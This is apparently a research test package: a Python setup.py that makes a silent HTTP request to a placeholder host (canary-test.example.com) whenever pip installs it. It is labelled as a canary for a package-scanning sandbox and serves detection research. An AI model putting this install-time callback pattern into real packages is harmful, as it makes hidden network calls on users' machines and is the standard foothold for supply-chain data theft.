"""
SAFETY RESEARCH PACKAGE — NOT REAL MALWARE.
Technique: HTTP callback during pip install (urllib GET in setup.py).
Sink: canary-test.example.com (fake; unreachable on the real internet).
"""
import urllib.request
from setuptools import setup

# Fires when pip runs setup.py to build/install this package.
# In the pkgids sandbox this hits the fakeinternet appliance on detonet.
try:
    urllib.request.urlopen(
        "http://canary-test.example.com/installed",
        timeout=5,
    )
except Exception:
    pass

setup(
    name="canary-http-install",
    version="1.0.0",
    description="[CORPUS] HTTP callback on install — safety research package",
    packages=["canary_http_install"],
)
